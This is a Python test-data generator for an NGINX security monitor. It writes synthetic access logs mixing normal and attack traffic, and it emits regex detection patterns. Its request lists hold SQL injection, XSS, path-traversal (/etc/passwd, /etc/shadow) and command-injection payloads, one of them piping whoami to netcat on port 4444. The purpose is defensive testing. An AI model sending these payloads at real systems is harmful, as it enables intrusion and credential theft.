#!/usr/bin/env python3
"""
NGINX Security Monitor - Test Data Generator
Generate realistic test data for development and testing.
"""

import os
import sys
import argparse
import json
import random
import gzip
from datetime import datetime, timedelta
from pathlib import Path

# Add the src directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src"))

def print_generator_header():
    """Print generator header."""
    print("🎭 NGINX Security Monitor - Test Data Generator")
    print("=" * 50)

def get_random_ip():
    """Generate a random IP address."""
    # Mix of legitimate and suspicious IP ranges
    ip_pools = [
        # Legitimate internal ranges
        lambda: f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
        lambda: f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}",
        lambda: f"172.16.{random.randint(1, 254)}.{random.randint(1, 254)}",
        # Legitimate external ranges (simulated)
        lambda: f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
        # Known suspicious ranges (for testing)
        lambda: f"203.0.113.{random.randint(1, 254)}",  # TEST-NET-3
        lambda: f"198.51.100.{random.randint(1, 254)}",  # TEST-NET-2
    ]
    
    return random.choice(ip_pools)()

def get_random_user_agent(category='mixed'):
    """Generate random user agents by category."""
    
    legitimate_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
    ]
    
    suspicious_agents = [
        "sqlmap/1.4.7#stable (http://sqlmap.org)",
        "Nikto/2.1.6",
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "Burp Suite Professional",
        "OWASP ZAP/2.10.0",
        "Gobuster/3.1.0",
        "dirb 2.22",
        "WPScan v3.8.18",
        "whatweb/0.5.5",
        "curl/7.68.0",
        "wget/1.20.3",
        "Python-urllib/3.8",
        "Scrapy/2.5.0",
        "Bot/1.0"
    ]
    
    bot_agents = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "facebookexternalhit/1.1",
        "Twitterbot/1.0",
        "LinkedInBot/1.0"
    ]
    
    if category == 'legitimate':
        return random.choice(legitimate_agents)
    elif category == 'suspicious':
        return random.choice(suspicious_agents)
    elif category == 'bot':
        return random.choice(bot_agents)
    else:  # mixed
        all_agents = legitimate_agents + suspicious_agents + bot_agents
        return random.choice(all_agents)

def get_random_request(attack_type=None):
    """Generate random HTTP requests by attack type."""
    
    legitimate_requests = [
        "GET / HTTP/1.1",
        "GET /index.html HTTP/1.1",
        "GET /about.html HTTP/1.1",
        "GET /contact.html HTTP/1.1",
        "GET /products.html HTTP/1.1",
        "GET /services.html HTTP/1.1",
        "GET /blog/ HTTP/1.1",
        "GET /news/ HTTP/1.1",
        "POST /contact.php HTTP/1.1",
        "POST /login.php HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "GET /js/script.js HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /robots.txt HTTP/1.1",
        "GET /sitemap.xml HTTP/1.1"
    ]
    
    sql_injection_requests = [
        "GET /search.php?q=1' OR 1=1-- HTTP/1.1",
        "GET /user.php?id=1 UNION SELECT * FROM users-- HTTP/1.1",
        "POST /login.php HTTP/1.1",  # Contains: username=admin' OR '1'='1'--
        "GET /admin.php?id=1'; DROP TABLE users;-- HTTP/1.1",
        "GET /search.php?q=test' AND 1=2 UNION SELECT null,username,password FROM admin-- HTTP/1.1",
        "GET /product.php?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- HTTP/1.1",
        "GET /news.php?id=1' UNION SELECT @@version,@@datadir-- HTTP/1.1"
    ]
    
    xss_requests = [
        "GET /comment.php?msg=<script>alert('XSS')</script> HTTP/1.1",
        "GET /search.php?q=<img src=x onerror=alert(1)> HTTP/1.1",
        "POST /feedback.php HTTP/1.1",  # Contains: comment=<svg onload=alert('XSS')>
        "GET /profile.php?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1",
        "GET /guestbook.php?msg=<iframe src=javascript:alert('XSS')></iframe> HTTP/1.1",
        "GET /search.php?q=javascript:alert(String.fromCharCode(88,83,83)) HTTP/1.1"
    ]
    
    path_traversal_requests = [
        "GET /download.php?file=../../../etc/passwd HTTP/1.1",
        "GET /view.php?page=../../../../etc/shadow HTTP/1.1",
        "GET /include.php?path=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
        "GET /read.php?file=....//....//....//etc/hosts HTTP/1.1",
        "GET /show.php?doc=....\\....\\....\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1",
        "GET /file.php?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"
    ]
    
    command_injection_requests = [
        "GET /ping.php?host=8.8.8.8;cat /etc/passwd HTTP/1.1",
        "GET /system.php?cmd=ls -la && cat /etc/passwd HTTP/1.1",
        "GET /exec.php?command=whoami|nc 192.168.1.100 4444 HTTP/1.1",
        "GET /run.php?cmd=`cat /etc/passwd` HTTP/1.1",
        "GET /shell.php?c=$(whoami) HTTP/1.1"
    ]
    
    scanning_requests = [
        "GET /admin/ HTTP/1.1",
        "GET /admin/login.php HTTP/1.1",
        "GET /wp-admin/ HTTP/1.1",
        "GET /phpmyadmin/ HTTP/1.1",
        "GET /.env HTTP/1.1",
        "GET /.git/config HTTP/1.1",
        "GET /config.php HTTP/1.1",
        "GET /backup.sql HTTP/1.1",
        "GET /test.php HTTP/1.1",
        "GET /info.php HTTP/1.1",
        "HEAD / HTTP/1.1",
        "OPTIONS / HTTP/1.1"
    ]
    
    if attack_type == 'sql_injection':
        return random.choice(sql_injection_requests)
    elif attack_type == 'xss':
        return random.choice(xss_requests)
    elif attack_type == 'path_traversal':
        return random.choice(path_traversal_requests)
    elif attack_type == 'command_injection':
        return random.choice(command_injection_requests)
    elif attack_type == 'scanning':
        return random.choice(scanning_requests)
    elif attack_type == 'legitimate':
        return random.choice(legitimate_requests)
    else:  # mixed
        all_requests = (legitimate_requests + sql_injection_requests + 
                       xss_requests + path_traversal_requests + 
                       command_injection_requests + scanning_requests)
        return random.choice(all_requests)

def get_random_status_code(request_type='mixed'):
    """Generate appropriate status codes based on request type."""
    
    if request_type == 'legitimate':
        return random.choices([200, 301, 302, 304], weights=[70, 10, 10, 10])[0]
    elif request_type in ['sql_injection', 'xss', 'command_injection']:
        return random.choices([200, 400, 403, 500], weights=[30, 20, 30, 20])[0]
    elif request_type == 'path_traversal':
        return random.choices([403, 404, 500], weights=[50, 30, 20])[0]
    elif request_type == 'scanning':
        return random.choices([404, 403, 401, 200], weights=[50, 30, 15, 5])[0]
    else:  # mixed
        return random.choices([200, 301, 302, 400, 403, 404, 500], 
                            weights=[50, 5, 5, 10, 10, 15, 5])[0]

def generate_log_entry(timestamp, attack_type=None):
    """Generate a single log entry."""
    
    ip = get_random_ip()
    request = get_random_request(attack_type)
    status = get_random_status_code(attack_type)
    size = random.randint(0, 5000) if status == 200 else random.randint(0, 1000)
    
    # Referer (some entries have referers, some don't)
    if random.random() < 0.3:  # 30% chance of having a referer
        referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://example.com/",
            "https://github.com/",
            "https://stackoverflow.com/"
        ]
        referer = random.choice(referers)
    else:
        referer = "-"
    
    # User agent based on attack type
    if attack_type in ['sql_injection', 'xss', 'command_injection', 'path_traversal']:
        user_agent = get_random_user_agent('suspicious')
    elif attack_type == 'scanning':
        user_agent = get_random_user_agent(random.choice(['suspicious', 'bot']))
    else:
        user_agent = get_random_user_agent('legitimate')
    
    # Format timestamp for NGINX log format
    timestamp_str = timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000')
    
    # Build log entry
    log_entry = f'{ip} - - [{timestamp_str}] "{request}" {status} {size} "{referer}" "{user_agent}"'
    
    return log_entry

def generate_attack_scenario(scenario_type, base_time, duration_minutes=60, intensity='medium'):
    """Generate a complete attack scenario."""
    
    entries = []
    start_time = base_time
    end_time = start_time + timedelta(minutes=duration_minutes)
    
    # Define intensity levels
    intensity_config = {
        'low': {'requests_per_minute': 2, 'ips': 1},
        'medium': {'requests_per_minute': 10, 'ips': 3},
        'high': {'requests_per_minute': 30, 'ips': 8},
        'extreme': {'requests_per_minute': 100, 'ips': 20}
    }
    
    config = intensity_config.get(intensity, intensity_config['medium'])
    
    # Generate attack IPs
    attack_ips = [get_random_ip() for _ in range(config['ips'])]
    
    current_time = start_time
    while current_time < end_time:
        # Generate requests for this minute
        for _ in range(random.randint(1, config['requests_per_minute'])):
            # Randomize timestamp within the minute
            request_time = current_time + timedelta(seconds=random.randint(0, 59))
            
            # Override IP for attack scenarios
            original_get_random_ip = globals()['get_random_ip']
            globals()['get_random_ip'] = lambda: random.choice(attack_ips)
            
            entry = generate_log_entry(request_time, scenario_type)
            entries.append(entry)
            
            # Restore original function
            globals()['get_random_ip'] = original_get_random_ip
        
        current_time += timedelta(minutes=1)
    
    return entries

def generate_baseline_traffic(start_time, duration_hours=24, requests_per_hour=100):
    """Generate baseline legitimate traffic."""
    
    entries = []
    end_time = start_time + timedelta(hours=duration_hours)
    
    current_time = start_time
    while current_time < end_time:
        # Generate requests for this hour
        hour_requests = random.randint(int(requests_per_hour * 0.7), int(requests_per_hour * 1.3))
        
        for _ in range(hour_requests):
            # Randomize timestamp within the hour
            request_time = current_time + timedelta(seconds=random.randint(0, 3599))
            entry = generate_log_entry(request_time, 'legitimate')
            entries.append(entry)
        
        current_time += timedelta(hours=1)
    
    return entries

def generate_mixed_traffic(start_time, duration_hours=24, total_requests=1000, attack_ratio=0.1):
    """Generate mixed traffic with specified attack ratio."""
    
    entries = []
    attack_requests = int(total_requests * attack_ratio)
    legitimate_requests = total_requests - attack_requests
    
    end_time = start_time + timedelta(hours=duration_hours)
    time_span = (end_time - start_time).total_seconds()
    
    # Generate legitimate traffic
    for _ in range(legitimate_requests):
        random_time = start_time + timedelta(seconds=random.randint(0, int(time_span)))
        entry = generate_log_entry(random_time, 'legitimate')
        entries.append(entry)
    
    # Generate attack traffic
    attack_types = ['sql_injection', 'xss', 'path_traversal', 'command_injection', 'scanning']
    for _ in range(attack_requests):
        random_time = start_time + timedelta(seconds=random.randint(0, int(time_span)))
        attack_type = random.choice(attack_types)
        entry = generate_log_entry(random_time, attack_type)
        entries.append(entry)
    
    # Sort by timestamp
    entries.sort(key=lambda x: x.split('[')[1].split(']')[0])
    
    return entries

def save_log_entries(entries, output_file, compress=False):
    """Save log entries to file."""
    
    print(f"💾 Saving {len(entries)} entries to {output_file}...")
    
    try:
        if compress and output_file.endswith('.gz'):
            with gzip.open(output_file, 'wt') as f:
                for entry in entries:
                    f.write(entry + '\n')
        else:
            with open(output_file, 'w') as f:
                for entry in entries:
                    f.write(entry + '\n')
        
        print(f"   ✅ Successfully saved log file")
        
        # Show file size
        file_size = os.path.getsize(output_file)
        if file_size > 1024 * 1024:
            size_str = f"{file_size / (1024 * 1024):.1f} MB"
        elif file_size > 1024:
            size_str = f"{file_size / 1024:.1f} KB"
        else:
            size_str = f"{file_size} bytes"
        
        print(f"   📊 File size: {size_str}")
        
    except Exception as e:
        print(f"   ❌ Failed to save file: {e}")

def create_test_patterns():
    """Create test attack patterns for validation."""
    
    patterns = {
        "attack_patterns": {
            "sql_injection_basic": {
                "pattern": r"(\bor\b\s+\d+\s*=\s*\d+|union\s+select|drop\s+table)",
                "description": "Basic SQL injection patterns",
                "severity": "high",
                "category": "injection"
            },
            "sql_injection_advanced": {
                "pattern": r"(information_schema|@@version|@@datadir|load_file\s*\()",
                "description": "Advanced SQL injection techniques",
                "severity": "high",
                "category": "injection"
            },
            "xss_script_tags": {
                "pattern": r"<script[^>]*>.*?</script>",
                "description": "XSS script tag injection",
                "severity": "medium",
                "category": "xss"
            },
            "xss_event_handlers": {
                "pattern": r"(on\w+\s*=|javascript:)",
                "description": "XSS event handler injection",
                "severity": "medium",
                "category": "xss"
            },
            "path_traversal": {
                "pattern": r"(\.\.\/|\.\.\\|%2e%2e)",
                "description": "Directory traversal attempts",
                "severity": "medium",
                "category": "traversal"
            },
            "command_injection": {
                "pattern": r"(;\s*(cat|ls|whoami|id|uname)|`.*`|\$\(.*\))",
                "description": "Command injection attempts",
                "severity": "high",
                "category": "injection"
            },
            "suspicious_user_agents": {
                "pattern": r"(sqlmap|nikto|nmap|burp|zap|scanner|dirb|gobuster)",
                "description": "Suspicious scanning tools",
                "severity": "low",
                "category": "reconnaissance"
            }
        }
    }
    
    return patterns

def main():
    parser = argparse.ArgumentParser(
        description="Generate realistic test data for NGINX Security Monitor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --scenario sql_injection --output sql_attack.log
  %(prog)s --baseline --duration 24 --requests-per-hour 500
  %(prog)s --mixed --requests 10000 --attack-ratio 0.05
  %(prog)s --all-scenarios --output-dir test_data/
  %(prog)s --patterns-only --output patterns.json
        """
    )
    
    parser.add_argument(
        '--scenario',
        choices=['sql_injection', 'xss', 'path_traversal', 'command_injection', 'scanning'],
        help='Generate specific attack scenario'
    )
    
    parser.add_argument(
        '--baseline',
        action='store_true',
        help='Generate baseline legitimate traffic'
    )
    
    parser.add_argument(
        '--mixed',
        action='store_true',
        help='Generate mixed legitimate and attack traffic'
    )
    
    parser.add_argument(
        '--all-scenarios',
        action='store_true',
        help='Generate all attack scenarios'
    )
    
    parser.add_argument(
        '--patterns-only',
        action='store_true',
        help='Generate only test patterns file'
    )
    
    parser.add_argument(
        '--output', '-o',
        default='test_access.log',
        help='Output file path'
    )
    
    parser.add_argument(
        '--output-dir',
        default='test_data',
        help='Output directory for multiple files'
    )
    
    parser.add_argument(
        '--duration',
        type=int,
        default=1,
        help='Duration in hours for baseline traffic'
    )
    
    parser.add_argument(
        '--requests-per-hour',
        type=int,
        default=100,
        help='Requests per hour for baseline traffic'
    )
    
    parser.add_argument(
        '--requests',
        type=int,
        default=1000,
        help='Total requests for mixed traffic'
    )
    
    parser.add_argument(
        '--attack-ratio',
        type=float,
        default=0.1,
        help='Ratio of attack traffic (0.0-1.0)'
    )
    
    parser.add_argument(
        '--intensity',
        choices=['low', 'medium', 'high', 'extreme'],
        default='medium',
        help='Attack intensity level'
    )
    
    parser.add_argument(
        '--compress',
        action='store_true',
        help='Compress output files with gzip'
    )
    
    parser.add_argument(
        '--start-time',
        help='Start time (YYYY-MM-DD HH:MM), default: 24 hours ago'
    )
    
    args = parser.parse_args()
    
    print_generator_header()
    
    # Parse start time
    if args.start_time:
        try:
            start_time = datetime.strptime(args.start_time, '%Y-%m-%d %H:%M')
        except ValueError:
            print(f"❌ Invalid start time format. Use YYYY-MM-DD HH:MM")
            sys.exit(1)
    else:
        start_time = datetime.now() - timedelta(hours=24)
    
    print(f"📅 Start time: {start_time.strftime('%Y-%m-%d %H:%M')}")
    
    # Generate patterns only
    if args.patterns_only:
        patterns = create_test_patterns()
        
        with open(args.output, 'w') as f:
            json.dump(patterns, f, indent=2)
        
        print(f"✅ Test patterns saved to: {args.output}")
        return
    
    # Create output directory if needed
    if args.all_scenarios:
        os.makedirs(args.output_dir, exist_ok=True)
        print(f"📁 Output directory: {args.output_dir}")
    
    # Generate data based on mode
    if args.scenario:
        print(f"🎯 Generating {args.scenario} attack scenario...")
        entries = generate_attack_scenario(args.scenario, start_time, 60, args.intensity)
        output_file = args.output
        if args.compress and not output_file.endswith('.gz'):
            output_file += '.gz'
        save_log_entries(entries, output_file, args.compress)
        
    elif args.baseline:
        print(f"📊 Generating baseline traffic...")
        print(f"   Duration: {args.duration} hours")
        print(f"   Rate: {args.requests_per_hour} requests/hour")
        entries = generate_baseline_traffic(start_time, args.duration, args.requests_per_hour)
        output_file = args.output
        if args.compress and not output_file.endswith('.gz'):
            output_file += '.gz'
        save_log_entries(entries, output_file, args.compress)
        
    elif args.mixed:
        print(f"🎭 Generating mixed traffic...")
        print(f"   Total requests: {args.requests}")
        print(f"   Attack ratio: {args.attack_ratio * 100:.1f}%")
        entries = generate_mixed_traffic(start_time, args.duration, args.requests, args.attack_ratio)
        output_file = args.output
        if args.compress and not output_file.endswith('.gz'):
            output_file += '.gz'
        save_log_entries(entries, output_file, args.compress)
        
    elif args.all_scenarios:
        print(f"🎪 Generating all attack scenarios...")
        
        scenarios = ['sql_injection', 'xss', 'path_traversal', 'command_injection', 'scanning']
        
        for scenario in scenarios:
            print(f"\n🎯 Generating {scenario} scenario...")
            entries = generate_attack_scenario(scenario, start_time, 60, args.intensity)
            
            output_file = os.path.join(args.output_dir, f"{scenario}.log")
            if args.compress:
                output_file += '.gz'
            
            save_log_entries(entries, output_file, args.compress)
        
        # Generate baseline traffic
        print(f"\n📊 Generating baseline traffic...")
        baseline_entries = generate_baseline_traffic(start_time, 24, 200)
        baseline_file = os.path.join(args.output_dir, "baseline.log")
        if args.compress:
            baseline_file += '.gz'
        save_log_entries(baseline_entries, baseline_file, args.compress)
        
        # Generate mixed traffic
        print(f"\n🎭 Generating mixed traffic...")
        mixed_entries = generate_mixed_traffic(start_time, 24, 5000, 0.1)
        mixed_file = os.path.join(args.output_dir, "mixed.log")
        if args.compress:
            mixed_file += '.gz'
        save_log_entries(mixed_entries, mixed_file, args.compress)
        
        # Generate test patterns
        patterns = create_test_patterns()
        patterns_file = os.path.join(args.output_dir, "test_patterns.json")
        with open(patterns_file, 'w') as f:
            json.dump(patterns, f, indent=2)
        print(f"✅ Test patterns saved to: {patterns_file}")
        
    else:
        print("❌ Please specify a generation mode:")
        print("   --scenario ATTACK_TYPE")
        print("   --baseline")
        print("   --mixed")
        print("   --all-scenarios")
        print("   --patterns-only")
        sys.exit(1)
    
    print(f"\n🎉 Test data generation complete!")
    print(f"💡 Use with: ./bin/test-patterns --custom-logs {args.output if not args.all_scenarios else args.output_dir}")

if __name__ == "__main__":
    main()
